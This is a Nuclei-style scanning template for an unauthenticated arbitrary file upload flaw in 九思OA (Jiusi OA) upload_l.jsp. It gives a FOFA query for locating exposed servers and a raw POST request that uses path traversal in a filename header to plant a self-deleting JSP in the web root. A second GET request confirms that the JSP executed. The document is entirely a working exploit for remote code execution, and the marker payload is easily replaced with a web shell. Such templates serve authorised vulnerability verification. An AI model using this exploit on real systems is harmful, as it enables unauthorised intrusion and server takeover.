id: jiusi-oa-upload_ljsp-upload

info:
  name: "九思OA upload_l.jsp 未授权文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/jsoa/webmail/ajax_util.js"
        九思OA系统upload_l.jsp组件存在未经验证的文件上传功能，允许攻击者上传恶意文件以执行任意代码。
  tags: 九思OA

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /jsoa/wpsforlinux/src/upload_l.jsp?openType=1&flowflag=1&userName=1&recordId=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Connection: close
    Upgrade-Insecure-Requests: 1
    filename: /../../NTest.jsp

    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
- raw:
  - |
    GET /jsoa/NTest.jsp HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
